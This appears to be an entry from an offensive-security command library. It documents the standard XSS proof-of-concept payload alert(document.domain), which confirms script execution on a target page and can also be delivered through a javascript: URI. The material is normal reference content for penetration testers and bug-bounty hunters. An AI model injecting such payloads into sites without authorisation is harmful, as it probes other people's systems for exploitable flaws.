---
data: alert(document.domain)
tags:
  - xss
  - javascript
type: command
executor: javascript
platforms:
  - Web
id: 37b9ac7c-d80f-4814-8c7e-8d88783c384c
created_at: '2025-12-13T23:56:20.036Z'
updated_at: '2025-12-13T23:56:20.036Z'
verified: false
validated: true
submitted: true
---
# alert-document-domain

## Command

```javascript
alert(document.domain)
```

## Description

Displays an alert box showing the current document domain to demonstrate XSS execution in the target's context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `document.domain` | Shows the domain of the current page | Yes |

## Examples

### Basic Usage

```javascript
alert(document.domain)
```

### Advanced Usage

Used within a javascript: URI for redirects.

## Expected Output

Alert box with 'www.hackerone.com'

## Related

- [[procedures/Craft-XSS-Payload-for-PostMessage]]
